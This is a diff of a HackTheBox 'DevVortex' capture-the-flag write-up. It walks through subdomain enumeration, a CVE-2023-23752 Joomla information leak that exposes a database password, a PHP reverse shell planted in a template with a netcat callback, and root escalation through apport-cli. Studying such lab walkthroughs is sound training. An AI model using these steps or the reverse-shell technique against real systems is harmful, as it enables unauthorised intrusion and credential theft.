@@ -1,5 +1,6 @@
 ---
 title: "DevVortex"
+link: "https://www.hackthebox.com/machines/devvortex"
 description: "Easy HackTheBox seasonal machine."
 author: "hackthebox"
 date: "2024-02-08"
@@ -10,10 +11,11 @@ tags: ["capture the flag", "hackthebox", "web", "networks"]
 # DevVortex
 
 <aside>
+<a href={link}>{title} @ {author}</a><br/>
 Another easy HackTheBox machine demonstrating some vulnerabilities with readily-accessible proof-of-concept exploits.
 </aside>
 
-## Reconnaissance
+## Recon/enumeration
 
 Running `rustscan` to enumerate for open ports, we’re given an `nginx` service on port 80 and an `ssh` service on port 22.
 
@@ -27,12 +29,15 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
 
-We can’t access `ssh` without credentials, and there is nothing to find of particular interest on the webpage itself; I did some enumeration with `feroxbuster` and re-ran port scans with various options, but its just static HTML.
-Looking at some `nginx` vulnerabilities for `v1.18.0` was also a pretty big waste of time.
+We aren't allowed to access `ssh` without credentials (Anon login disallowed), and there is nothing to find of particular interest on the webpage itself; I did some directory enumeration with
+`feroxbuster` and re-ran port scans with various options, but none of the pages have any hidden functionality or exploitable holes, including the handful of `nginx v1.18.0`
+vulnerabilities with public proof-of-concept exploits.
 
-I wasn’t *particularly* keen on having to enumerate for domain stuff - I’ll have to do more work to learn a tool or write code, but HTB often makes use of virtual hosts/subdomains, which we can enumerate for via the `Host` header of a HTTP GET request.
+Ultimately, I wasn’t *particularly* keen on having to enumerate for domain stuff (as I will have to do more work in order to learn a tool/write code - which I wind up doing anyway).
+HTB often makes use of virtual hosts/subdomains, which we can enumerate for via the `Host` header of a HTTP GET request, so I wrote the following Python script to pull common subdomain names from a
+wordlist.
 
-I wrote the following Python script, but it would be handy to have a simple single-purpose tool for this, so I want to rewrite this in Rust at some point.
+> It would be handy to have a simple single-purpose tool for this, so I ~~want to rewrite this in Rust at some point~~ [rewrote it in Rust](https://github.com/plsuwu/vhost-enum).
 
 ```python
 #!/usr/bin/env python
@@ -41,7 +46,13 @@ import os
 import requests
 
 IP = "10.10.11.242"
-host_list: list[str] = (open("/home/please/git/red_tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt").read().strip().split("\\n"))
+host_list: list[str] = (open(
+    "/home/please/git/red_tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt")
+                        .read()
+                        .strip()
+                        .split("\\n")
+    )
+
 
 for host in host_list:
     headers: dict[str, str] = {"Host": f"{host}.devvortex.htb"}
@@ -62,7 +73,7 @@ for host in host_list:
 
 ```
 
-The script only makes it like 10 requests in, but it registers a response with a 200 status from the subdomain `dev.devvortex.htb`.
+The script only makes it like 10 requests in as it very quickly returns a response for a subdomain with a 200 status - `dev.devvortex.htb`.
 
 ```
 [...]
@@ -93,11 +104,12 @@ $ feroxbuster --url <http://dev.devvortex.htb/> --smart -t 20 -w ~/git/red_tools
 [...]
 ```
 
-Our scan turns up an `/administrator/` endpoint, which holds a Joomla! CMS login:
+This scan winds up returning an `/administrator/` endpoint, which is always very interesting. The contents of this endpoint indicate the web application is running a Joomla! CMS under the hood:
 
 ![Untitled](/img/devvortex_img/Untitled.png)
 
-We can run `droopescan`, which informs us that the server is running version `4.2.6` of Joomla at the `/administrator/manifests/files/joomla.xml` endpoint.
+This means we can run `droopescan` to gather some more information; we know the server is running Joomla! version `4.2.6`, as indicated by the document at the
+`/administrator/manifests/files/joomla.xml` endpoint:
 
 ```bash
 $ ./droopescan scan joomla --url <http://dev.devvortex.htb>                                                                                                                                                       ✭
@@ -112,11 +124,11 @@ $ ./droopescan scan joomla --url <http://dev.devvortex.htb>                     
 [+] Scan finished (0:00:00.860053 elapsed)
 ```
 
-## Initial access
+## Initial SSH access
 
 This version of Joomla is vulnerable to `CVE-2023-23752`, which is an unauthenticated information disclosure vulnerability. We can exploit this to gain access to the CMS as a superuser with `lewis@devvortex.htb`'s credentials:
 
-```
+```bash
 $ ruby exploit.rb <http://dev.devvortex.htb>
 Users
 [649] lewis (lewis) - lewis@devvortex.htb - Super Users
@@ -139,48 +151,54 @@ DB prefix: sd4fg_
 DB encryption 0
 ```
 
-> Also making a mental note of the `mysqli` DB.
+> Also taking note of the reference to a `mysql` DB.
 
-At this point, I kept getting the following error, alongside repeated invalidation of my session cookie and being kicked out of the CMS.
+At this point, I kept getting the following error, alongside repeated invalidation of my session cookie and being kicked out of the CMS:
 
 ![Untitled](/img/devvortex_img/Untitled%201.png)
 
-I thought this was part of the box (it wasn’t) so I got stuck here for a *very* long time - this issue was persistent through box resets - but swapping to another HTB server fixed this issue.
+As this issue was persistent through VM instance resets, I thought this was part of the box (it wasn’t) so I wound up losing a lot of time.
+Ultimately, I had to swap HTB server regions before I could continue as intended.
 
-Similar to other CMS backends, like `Wordpress`, we can write malicious PHP to one of the template files (I used `/templates/cassiopiea/error.php`) and execute that as a PHP program; in this case, we can do the
-classic PentestMonkey PHP reverse shell script with our local IP and favorite port, start up a netcat listener, and make a GET request for `http://dev.devvortex.htb/templates/cassiopeia/error.php` to
-execute the script to get onto the machine via `ssh`.
+Faulty machines aside, we can write malicious PHP to one of the template files - this is similar to other CMS backends like `Wordpress`, which will allows us to execute arbitrary code very
+easily; in this case, we can use the classic PentestMonkey PHP reverse shell script, replacing the network info with our local IP and favorite port. We can then write it to the template file,
+start up a netcat listener, and finally, make a GET request for `http://dev.devvortex.htb/templates/cassiopeia/error.php` to execute the script, initiating the remote machine to call back
+to our local `netcat` listener.
 
 ![Untitled](/img/devvortex_img/Untitled%202.png)
 
-We can also run through some commands to upgrade the dumb shell session to a `tty` - this is more convenience than anything:
+We can also run through some commands to upgrade the dumb shell session to a `tty` - this is more convenience than anything, but will allow us to (amongst other things) hit `<C-c`
+to send a `SIGINT` to the remote shell, as opposed to just accidentally interrupting our local `netcat` session.
+- There is an available `python3` binary, so we can spawn a `pty` (pseudo-teletype) with python's built-in `pty` module (`python3 -c 'import pty; pty.spawn("/bin/bash")`)
+- We can then upgrade the python-invoked `pty` to a fully interactive `tty` by copying over some of our terminal environment.
 
-- We can use the available `python3` binary to spawn a `pseudo-teletype`/`pty` with the `pty` module (`python3 -c 'import pty; pty.spawn("/bin/bash")`)
-- We can then upgrade the python-invoked `pty` to a fully interactive `tty` by copying over some of our terminal environment - allowing the `ssh` session to register the keys we send exactly as we send them:
+The following output is a little bit messy, but we essentially send the raw stdin data directly to the remote session:
 
 ```bash
-[please@ruby]:[~] $ nc -lnvp 9999                                                                                                                             130 ↵
+\[pls@ruby\]:\[~\] \$ nc -lnvp 9999                                                                                                                             130 ↵
 Listening on 0.0.0.0 9999
+
 Connection received on 10.129.45.143 39578
 Linux devvortex 5.4.0-167-generic #184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
  13:46:45 up 53 min,  0 users,  load average: 0.00, 0.01, 0.00
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
-sh: 0: can't access tty; job control turned off
+sh: 0: can\'t access tty; job control turned off
+
 $ whoami
 www-data
-$ echo $TERM
-
-$ which python
-$ which python3
+\$ echo $TERM
+\$ which python
+\$ which python3
 /usr/bin/python3
-$ python3 -c 'import pty; pty.spawn("/bin/bash")'
-www-data@devvortex:/$ echo $TERM
+\$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+\www-data@devvortex:/\$ echo $TERM
 echo $TERM
 dumb
-www-data@devvortex:/$ ^Z
-[1]  + 219973 suspended  nc -lnvp 9999
-[please@ruby]:[~] $ echo $TERM; stty -a                                                                                                                       148 ↵
+\www-data@devvortex:/\$ ^Z
+\[1\]  + 219973 suspended  nc -lnvp 9999
+
+\[please@ruby\]:\[~\] \$ echo $TERM; stty -a                                                                                                                       148 ↵
 tmux-256color
 speed 38400 baud; rows 74; columns 164; line = 0;
 intr = ^C; quit = ^\\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W;
@@ -189,25 +207,29 @@ lnext = ^V; discard = ^O; min = 1; time = 0;
 -ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel iutf8
 opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
 isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
-[please@ruby]:[~] $ stty raw -echo;fg
+\[please@ruby\]:\[~\] \$ stty raw -echo;fg
+
 [1]  + 219973 continued  nc -lnvp 9999
                                       reset
 reset: unknown terminal type unknown
 Terminal type? tmux-256color
-www-data@devvortex:/$ export SHELL=zsh
-www-data@devvortex:/$ export TERM=tmux-256color
-www-data@devvortex:/$ stty rows 74 columns 164
+\www-data@devvortex:/\$ export SHELL=zsh
+\www-data@devvortex:/\$ export TERM=tmux-256color
+\www-data@devvortex:/\$ stty rows 74 columns 164
 ```
 
-Now `cat`’ing out `/etc/passwd`, we see that there are two users with login shells - `root` and `logan`.
+`cat`ing out `/etc/passwd`, we see that there are two users with login shells - `root` and `logan`, alongside a `MySQL` user that might be useful should we require credentials.
 
 ```bash
 www-data@devvortex:/$ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
+
 [...]
+
 mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
 logan:x:1000:1000:,,,:/home/logan:/bin/bash
 ```
+> spoiler we do need credentials we need them you'll see in literally two lines
 
 ## Privilege escalation | User
 
@@ -220,9 +242,9 @@ total 28
 -rw-r----- 1 root  logan   33 Feb  5 12:53 user.txt
 ```
 
-Going back to the information scraped from the vulnerable Joomla! service, we can log into the `mysql` database as `lewis`:
+Recalling the information scraped from the vulnerable Joomla! service, we can log into the `mysql` database as `lewis`:
 
-```sql
+```bash
 www-data@devvortex:/home/logan$ mysql --user=lewis --password=P4ntherg0t1n5r3c0n## --host=localhost
 mysql: [Warning] Using a password on the command line interface can be insecure.
 Welcome to the MySQL monitor.  Commands end with ; or \\g.
@@ -240,7 +262,7 @@ Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.
 
 Running a few SQL commands to focus in on potential account credentials, we are able to print off the `users` table:
 
-```
+```sql
 mysql> show databases;
 +--------------------+
 | Database           |
@@ -361,8 +383,8 @@ Please choose (S/V/K/I/C): v
 
 ```
 
-Choosing option `V` opens the log in the `apport-cli` report viewer, which seems to almost just be a partially-modified Vim or Vi or something like that. We can invoke a `root` shell with `!bash` and then `cat` out the
-second flag at `/root/root.txt`:
+Choosing option `V` opens the log in the `apport-cli` report viewer, which seems similar to a Vi or Vi-adjacent editor - we can invoke a `root` shell by simply typing `!bash`, and then `cat` out the
+second flag at the usual `/root/root.txt` directory:
 
 ```bash
 == CrashDB =================================
@@ -390,6 +412,7 @@ subprocess.Popen(payload_cmd, shell=True)
 """, {}) }
 !bash
 ```
+> This is a little tricky to show without a moving image; if this doesn't really make sense, check out [this article](https://donncha.is/2016/12/compromising-ubuntu-desktop/).
 
 ```bash
 *** Collecting problem information
